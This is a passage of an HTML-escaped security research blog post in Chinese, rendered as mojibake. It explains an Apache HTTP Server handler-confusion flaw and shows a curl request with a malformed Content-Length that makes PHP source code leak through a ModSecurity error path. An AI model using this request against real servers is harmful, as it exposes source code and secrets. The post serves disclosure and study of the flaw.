&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-3-handler-confusion&quot;&gt;üî• 3. Handler Confusion&lt;/h3&gt;

&lt;p&gt;ÊúÄÂæå‰∏ÄÂÄãË¶Å‰ªãÁ¥πÁöÑÊîªÊìäÊòØ Handler ‰∏äÁöÑ Confusion„ÄÇ ÈÄôÂÄãÊîªÊìäÂêåÊ®£‰πüÂà©Áî®‰∫Ü‰∏ÄÂÄã Apache HTTP Server Âæû‰∏äÂè§ÊôÇÊúüÊû∂ÊßãÊâÄÈÅ∫Áïô‰∏ã‰æÜÁöÑÊäÄË°ìÂÇµ„ÄÇÈÄôË£°ÈÄèÈÅé‰∏ÄÂÄã‰æãÂ≠ê‰æÜËÆìËÆÄËÄÖÂø´ÈÄüÁöÑ‰∫ÜËß£ÈÄôÂÄãÊäÄË°ìÂÇµ ‚Äî‚Äî Â¶ÇÊûú‰ªäÂ§©ÊÉ≥Âú® Httpd ‰∏äÈÅãË°åÁ∂ìÂÖ∏ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt;Ôºå‰∏ãÈù¢ÂÖ©ÂÄãË™ûÊ≥ïË®≠ÂÆö‰Ω†Ë¶∫ÂæóÂì™ÂÄãÊâçÊòØÊ≠£Á¢∫ÁöÑÔºü&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; application/x-httpd-php .php
&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt;    application/x-httpd-php .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Á≠îÊ°àÊòØ ‚Äî‚Äî ÂÖ©ÂÄãÈÉΩÂèØ‰ª•Ê≠£Á¢∫Âú∞ËÆì PHP ÈÅãË°åËµ∑‰æÜÔºÅ ÈÄôË£°ÂàÜÂà•ÊòØÂÖ©ÂÄãË®≠ÂÆöÁöÑË™ûÊ≥ïÊ†ºÂºèÔºåÂèØ‰ª•ÁúãÂà∞ÂÖ©ÂÄãË®≠ÂÆö‰∏çÂÉÖÁî®Ê≥ï„ÄÅÂèÉÊï∏È°û‰ººÔºåÁèæÂú®ÈÄ£ÊïàÊûúÈÉΩ‰∏ÄÊ®°‰∏ÄÊ®£ÔºåÁÇ∫‰ªÄÈ∫º Apache HTTP Server Áï∂ÂàùË¶ÅË®≠Ë®àÂÖ©ÂÄã‰∏çÂêåÁöÑË™ûÊ≥ïÔºü&lt;/p&gt;

&lt;div class=&quot;language-config highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AddHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;span class=&quot;n&quot;&gt;AddType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;media&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt; [&lt;span class=&quot;n&quot;&gt;extension&lt;/span&gt;] ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂØ¶Èöõ‰∏ä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; Âú® Httpd ÁöÑÂÖßÈÉ®ÁµêÊßã‰∏≠‰ª£Ë°®Ëëó‰∏çÂêåÁöÑÊ¨Ñ‰ΩçÔºåÂàÜÂà•Â∞çÊáâÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt;„ÄÇ ËÄå&lt;strong&gt;‰ΩøÁî®ËÄÖÂèØ‰ª•Âú®Ê≤íÊúâÊÑüÁü•ÁöÑÊÉÖÊ≥Å‰∏ã‰ΩøÁî®ÂâáÊ≠∏ÂäüÊñº‰∏ÄÊÆµÂæû &lt;a href=&quot;https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c&quot;&gt;1996 Âπ¥&lt;/a&gt; Apache HTTP Server ÈñãÁôºÂàùÊúüÂ∞±ÈÅ∫ÁïôÂà∞ÁèæÂú®ÁöÑÁ®ãÂºèÁ¢º&lt;/strong&gt;Ôºö&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420&quot;&gt;server/config.c#L420&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;AP_CORE_DECLARE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_invoke_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ap_strchr_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;apr_pmemdup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                                        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

                &lt;span class=&quot;cm&quot;&gt;/* exclude media type arguments */&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* strip trailing spaces */&lt;/span&gt;

                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AP_DEFAULT_HANDLER_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_run_handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞Âú®ÈÄ≤ÂÖ•‰∏ªË¶ÅÁöÑÊ®°ÁµÑËôïÁêÜÂô® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_run_handler()&lt;/code&gt; ‰πãÂâçÔºåÂ¶ÇÊûúË´ãÊ±Ç‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; ÁÇ∫Á©∫ÂâáÊääÁµêÊßã‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; Ê¨Ñ‰ΩçÁöÑÂÖßÂÆπÁï∂ÊàêÊúÄÁµÇÂ∞áË¢´‰ΩøÁî®ÁöÑÊ®°ÁµÑËôïÁêÜÂô®„ÄÇ ÈÄô‰πüÂ∞±ÊòØÁÇ∫‰ªÄÈ∫º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; ‰ª•Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddHandler&lt;/code&gt; ÊïàÊûú‰∏ÄËá¥ÁöÑ‰∏ªË¶ÅÁêÜÁî±ÔºåÂõ†ÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;media-type&lt;/code&gt; ÊúÄÁµÇÂú®Âü∑Ë°åÂâçÈÇÑÊòØÊúÉË¢´ËΩâÊèõÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handler-name&lt;/code&gt;„ÄÇ ÊàëÂÄëÁöÑÁ¨¨‰∏âÂÄã Handler Confusion ‰∏ªË¶Å‰πüÂ∞±ÊòØÂúçÁπûÂú®ÈÄôÂÄãË°åÁÇ∫ÊâÄÁôºÂ±ïÂá∫‰æÜÁöÑÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-3-1-overwrite-the-handler&quot;&gt;‚öîÔ∏è Primitive 3-1. Overwrite the Handler&lt;/h4&gt;

&lt;p&gt;Âú®ÁêÜËß£ÈÄôÂÄãËΩâÊèõÊ©üÂà∂ÂæåÈ¶ñÂÖàÁ¨¨‰∏ÄÂÄãÊîªÊìäÊâãÊ≥ïÊòØ ‚Äî‚Äî &lt;strong&gt;Overwrite the Handler&lt;/strong&gt;ÔºåÊÉ≥ÂÉè‰∏Ä‰∏ãÂ¶ÇÊûú‰ªäÂ§©ÁõÆÊ®ôÁöÑ Apache HTTP Server ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; Â∞á PHP ÈÅãË°åËµ∑‰æÜ„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddType&lt;/span&gt; application/x-httpd-php  .php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âú®Ê≠£Â∏∏ÁöÑÊµÅÁ®ã‰∏≠ÁÄèË¶Ω &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/config.php&lt;/code&gt;„ÄÇ È¶ñÂÖàÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_mime&lt;/code&gt; ÊúÉÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type_checker&lt;/code&gt; ÈöéÊÆµÊ†πÊìö &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; ÊâÄË®≠ÂÆöÁöÑÈôÑÊ™îÂêçÂ∞áÁõ∏Â∞çÊáâÁöÑÂÖßÂÆπË§áË£ΩÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ‰∏≠ÔºåÁî±Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;handler&lt;/code&gt; Âú®Êï¥ÂÄã HTTP ÁîüÂëΩÈÄ±Êúü‰∏≠‰∏¶ÁÑ°Ë≥¶ÂÄºÔºåÊñºÊòØÂú®Âü∑Ë°åÊ®°ÁµÑËôïÁêÜÂô®Ââç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; ÊúÉÂ∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; Áï∂ÊàêÊ®°ÁµÑËôïÁêÜÂô®ÔºåÊúÄÁµÇÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; ËôïÁêÜË´ãÊ±Ç„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÂ¶ÇÊûú‰ªäÂ§©Êúâ‰ªª‰ΩïÊ®°ÁµÑÂú®Âü∑Ë°åÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ap_invoke_handler()&lt;/code&gt; Ââç„Äå‰∏çÂ∞èÂøÉ„ÄçÊää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; Ë¶ÜÂØ´Êéâ‰∫ÜÔºåÈÇ£ÊúÉÁôºÁîü‰ªÄÈ∫º‰∫ãÂë¢Ôºü&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-1-1-overwrite-handler-to-disclose-php-source-code&quot;&gt;‚úîÔ∏è 3-1-1. Overwrite Handler to Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;Âõ†Ê≠§ÈÄôÂÄãÊîªÊìäÊâãÊ≥ïÁöÑÁ¨¨‰∏ÄÂÄãÂà©Áî®Â∞±ÊòØÈÄèÈÅéÈÄôÂÄã„Äå‰∏çÂ∞èÂøÉ„ÄçÂéªÊ¥©Êºè‰ªªÊÑè PHP ÁöÑÂéüÂßãÁ¢º„ÄÇ ÈÄôÂÄãÊäÄË°ìÊúÄÊó©ÊòØÁî± Max Dmitriev Âú® ZeroNights 2021 ÊâÄÁôºË°®ÁöÑÁ†îÁ©∂‰∏≠ÊèêÂèä (kudos to him!)ÔºåÊºîË¨õ‰∏ªÈ°åÂèäÊäïÂΩ±ÁâáÂèØ‰ª•ÂæûÈÄôÈÇäÁúãÂà∞Ôºö&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf&quot;&gt;Apache 0day bug, which still nobody knows of, and which was fixed accidentally&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Max Dmitriev ËßÄÂØüÂà∞Âè™Ë¶ÅÈÄÅÂá∫ÈåØË™§ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Length&lt;/code&gt;ÔºåÈÅ†Á´Ø Httpd ‰º∫ÊúçÂô®ÊúÉÁôºÁîü‰∏çÊòéÁöÑÈåØË™§È†ÜÂ∏∂ÂõûÂÇ≥ PHP ÁöÑÂéüÂßãÁ¢ºÔºåÂú®Á¥∞ËøΩÊµÅÁ®ãÂæåÁôºÁèæÂÖ∂ÊàêÂõ†ÊòØ ModSecurity Âú®‰ΩøÁî® APR (Apache Portable Runtime) ÂáΩÁ§∫Â∫´ÊôÇ‰∏¶Êú™Â•ΩÂ•ΩÁöÑËôïÁêÜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; ÂõûÂÇ≥ÂÄºÊâÄÂ∞éËá¥ÁöÑ &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;double response&lt;/a&gt;„ÄÇ Áî±ÊñºÁôºÁîüÈåØË™§ÊôÇ Httpd ÊÉ≥ÈÄÅÂá∫‰∏Ä‰∫õ HTML ÈåØË™§Ë®äÊÅØÔºåÊñºÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;content_type&lt;/code&gt; ‰πüÈ†Ü‰æøË¢´Ë¶ÜÂØ´Êàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text/html&lt;/code&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áî±Êñº ModSecurity ‰∏¶Êú™Â¶•ÂñÑÁöÑËôïÁêÜÂõûÂÇ≥ÂÄº‰ΩøÂæóÊú¨Ë©≤ÂÅúÊ≠¢ÁöÑ Httpd ÂÖßÈÉ®ÊµÅÁ®ãÁπºÁ∫åÂü∑Ë°åÔºåËÄåÈÄôÂÄã„ÄåÂâØ‰ΩúÁî®„ÄçÂèàÊúÉÊääÂéüÊú¨Âä†‰∏äÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; Áµ¶Ë¶ÜÂØ´ÊéâÔºåÂ∞éËá¥ÊúÄÁµÇË©≤Ë¢´Áï∂Êàê PHP ÁöÑÊ™îÊ°àË¢´Áï∂Êàê‰∏ÄËà¨Êñá‰ª∂ËôïÁêÜ‰∏¶Â∞áÂÖ∂‰∏≠ÁöÑÁ®ãÂºèÁ¢ºÂèäÊïèÊÑüË®≠ÂÆöÂç∞Âá∫„ÄÇ ü§´&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://127.0.0.1/info.php &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Length: x&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; HTTP/1.1 400 Bad Request
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Server: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;title&amp;gt;400 Bad Request&amp;lt;/title&amp;gt;
...
&amp;lt;?php phpinfo&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁêÜË´ñ‰∏äÊâÄÊúâÂü∫Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; ÁöÑË®≠ÂÆöË™ûÊ≥ïÈÉΩÂÆπÊòìÈÅ≠ÂèóÊ≠§È°ûÂïèÈ°åÂΩ±ÈüøÔºåÊâÄ‰ª•Èô§‰∫Ü Max Âú®ÊäïÂΩ±Áâá‰∏≠ÊâÄÂ±ïÁ§∫ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi&lt;/code&gt; Êê≠ÈÖç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_actions&lt;/code&gt; Â§ñÔºåÁ¥îÁ≤πÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; Êê≠ÈÖç‰∏ä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AddType&lt;/code&gt; ‰πüÂêåÊ®£‰πüÂèóÂΩ±Èüø„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÂÄºÂæó‰∏ÄÊèêÁöÑÊòØÔºåÈÄôÂÄãÂâØ‰ΩúÁî®Âú® Apache HTTP Server ÁâàÊú¨ 2.4.44 ÊôÇË¢´Áï∂Êàê‰∏ÄÂÄã&lt;a href=&quot;https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a&quot;&gt;Â¢ûÈÄ≤Ë´ãÊ±ÇËß£ÊûêÂô®&lt;/a&gt;ÁöÑÁ®ãÂºèÈåØË™§Ë¢´Êõ¥Ê≠£ÔºåÊñºÊòØÈÄôÂÄã„ÄåÊºèÊ¥û„ÄçÂ∞±Ë¢´Áï∂ÊàêÂ∑≤‰øÆÂæ©Áõ¥Âà∞ÊàëÈáçÊñ∞ÊíøËµ∑ÂÆÉ„ÄÇ ‰ΩÜÁî±ÊñºÂÖ∂Ê†πÊú¨ÊàêÂõ†ÈÇÑÊòØ ModSecurity ‰∏¶Êú™Â•ΩÂ•ΩÁöÑËôïÁêÜÈåØË™§ÔºåÂè™Ë¶ÅÊâæÂà∞ÂÖ∂ÂÆÉÊ¢ùËß∏Áôº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AP_FILTER_ERROR&lt;/code&gt; ÁöÑË∑ØÂæëÈÇ£ÂêåÊ®£ÁöÑË°åÁÇ∫ÈÇÑÊòØÂèØ‰ª•ÈáçÁèæÊàêÂäü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Ê≠§ÂïèÈ°åÂ∑≤Êñº 6/20 ÈÄèÈÅéÂÆòÊñπ‰ø°ÁÆ±ÂõûÂ†±Áµ¶ ModSecurity ‰∏¶Áî± Project Co-Leader Âª∫Ë≠∞ÂõûÂà∞Âéü &lt;a href=&quot;https://github.com/owasp-modsecurity/ModSecurity/issues/2514&quot;&gt;GitHub Issue&lt;/a&gt; ‰∏≠Ë®éË´ñ„ÄÇ&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-3-1-2-overwrite-handler-to---&quot;&gt;‚úîÔ∏è 3-1-2. Overwrite Handler to ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà&lt;/h5&gt;

